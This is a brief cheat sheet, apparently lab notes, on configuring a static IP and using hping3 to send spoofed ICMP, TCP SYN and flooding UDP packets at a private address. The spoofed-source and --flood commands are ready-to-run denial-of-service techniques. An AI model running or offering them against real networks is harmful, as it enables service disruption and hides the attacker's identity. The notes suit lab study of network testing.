sudo ip addr flush dev eth0
sudo ip addr add 192.168.1.100/24 dev eth0
sudo ip link set dev eth0 up

add defualt gateway if needed:
sudo ip route add default via 192.168.1.1


using hping:

sudo hping3 -a <spoofed-IP> <target-IP> [options]

example:(icmp)

sudo hping3 -a 192.168.1.100 -1 -I eth0 192.168.1.1

Example 2: Send Spoofed TCP SYN Packet to Port 80

sudo hping3 -a 192.168.1.100 -S -p 80 -I eth0 192.168.1.1

Option	Description

-S	Set TCP SYN flag
-p 80	Target port
Others same as above	


Example 3: Flood Target with UDP Spoofed Packets

sudo hping3 -a 192.168.1.100 --udp -p 53 --flood -I eth0 192.168.1.1

⚠️ This can simulate a UDP flood — only use in lab setup.
